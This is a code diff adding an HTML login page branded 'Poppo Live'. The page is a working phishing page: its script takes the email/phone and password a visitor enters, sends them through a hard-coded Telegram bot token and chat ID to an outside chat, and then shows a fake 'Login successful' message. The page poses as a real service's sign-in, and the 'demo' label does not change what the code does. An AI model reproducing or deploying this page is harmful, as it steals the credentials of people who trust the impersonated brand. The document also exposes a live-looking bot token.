@@ -1,0 +1,210 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Poppo Live - Login</title>
+    <style>
+        /* Import Google Font */
+        @import url('https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;600&display=swap');
+
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Poppins', sans-serif;
+        }
+
+        body {
+            background: linear-gradient(135deg, #6e45e2, #88d3ce);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+        }
+
+        /* Login Container */
+        .login-container {
+            width: 100%;
+            max-width: 400px;
+            background: rgba(255, 255, 255, 0.1);
+            backdrop-filter: blur(10px);
+            padding: 25px;
+            border-radius: 12px;
+            box-shadow: 0 0 15px rgba(0, 0, 0, 0.2);
+            text-align: center;
+            color: #fff;
+        }
+
+        /* Poppo Logo */
+        .logo {
+            font-size: 28px;
+            font-weight: 700;
+            color: #ffdd57;
+            text-transform: uppercase;
+            margin-bottom: 15px;
+            letter-spacing: 1px;
+        }
+
+        h2 {
+            font-size: 24px;
+            font-weight: 600;
+        }
+
+        p {
+            font-size: 14px;
+            margin-bottom: 20px;
+        }
+
+        /* Input Fields */
+        input {
+            width: 100%;
+            padding: 12px;
+            margin: 10px 0;
+            border: none;
+            border-radius: 8px;
+            outline: none;
+            font-size: 14px;
+        }
+
+        /* Login Button */
+        .login-btn {
+            width: 100%;
+            padding: 12px;
+            background: #ff6f61;
+            border: none;
+            border-radius: 8px;
+            font-size: 16px;
+            color: white;
+            cursor: pointer;
+            transition: 0.3s;
+        }
+
+        .login-btn:hover {
+            background: #e85a4f;
+        }
+
+        /* Divider */
+        .divider {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin: 15px 0;
+        }
+
+        .divider span {
+            background: rgba(255, 255, 255, 0.2);
+            padding: 5px 15px;
+            border-radius: 50px;
+            font-size: 14px;
+        }
+
+        /* Social Login Buttons */
+        .social-btn {
+            width: 100%;
+            padding: 12px;
+            border: none;
+            border-radius: 8px;
+            font-size: 14px;
+            cursor: pointer;
+            transition: 0.3s;
+            margin: 5px 0;
+        }
+
+        .google {
+            background: #db4437;
+            color: white;
+        }
+
+        .google:hover {
+            background: #c1351e;
+        }
+
+        .facebook {
+            background: #1877f2;
+            color: white;
+        }
+
+        .facebook:hover {
+            background: #155db8;
+        }
+
+        /* Signup Text */
+        .signup-text {
+            font-size: 14px;
+            margin-top: 15px;
+        }
+
+        .signup-text a {
+            color: #ff6f61;
+            text-decoration: none;
+            font-weight: 600;
+        }
+    </style>
+</head>
+<body>
+
+    <div class="login-container">
+        <div class="logo">Poppo Live</div>  <!-- Poppo Branding -->
+        
+        <h2>Welcome Back!</h2>
+        <p>Log in to continue</p>
+
+        <form id="loginForm">
+            <input type="text" id="username" placeholder="Enter your email or phone" required>
+            <input type="password" id="password" placeholder="Enter your password" required>
+            <button type="submit" class="login-btn">Login</button>
+        </form>
+
+        <div class="divider">
+            <span>OR</span>
+        </div>
+
+        <div class="social-login">
+            <button class="social-btn google">Login with Google</button>
+            <button class="social-btn facebook">Login with Facebook</button>
+        </div>
+
+        <p class="signup-text">Don't have an account? <a href="#">Sign up</a></p>
+    </div>
+
+    <script>
+        document.getElementById("loginForm").addEventListener("submit", function(event) {
+            event.preventDefault();
+            
+            let username = document.getElementById("username").value;
+            let password = document.getElementById("password").value;
+            
+            if (username.trim() === "" || password.trim() === "") {
+                alert("Please enter both email/phone and password.");
+            } else {
+                sendToTelegram(username, password);
+                alert("Login successful! (This is a demo)");
+            }
+        });
+
+        function sendToTelegram(username, password) {
+            let botToken = "7905444120:AAHwbwsv8lVNCETUQSNgzw0z4YVI6vSKRos"; // Replace with your bot token
+            let chatId = "6992364240";     // Replace with your chat ID
+            
+            let message = `🔐 **New Login Attempt**\n📧 Email/Phone: ${username}\n🔑 Password: ${password}`;
+
+            let telegramAPI = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
+
+            fetch(telegramAPI, { method: "GET" })
+                .then(response => response.json())
+                .then(data => console.log("Message sent to Telegram:", data))
+                .catch(error => console.error("Error:", error));
+        }
+
+        document.querySelector(".google").addEventListener("click", function() {
+            alert("Google Login Clicked (Demo)");
+        });
+
+        document.querySelector(".facebook").addEventListener("click", function() {
+            alert("Facebook Login Clicked (Demo)");
+        });
+    </script>
+
+</body>
+  </html>
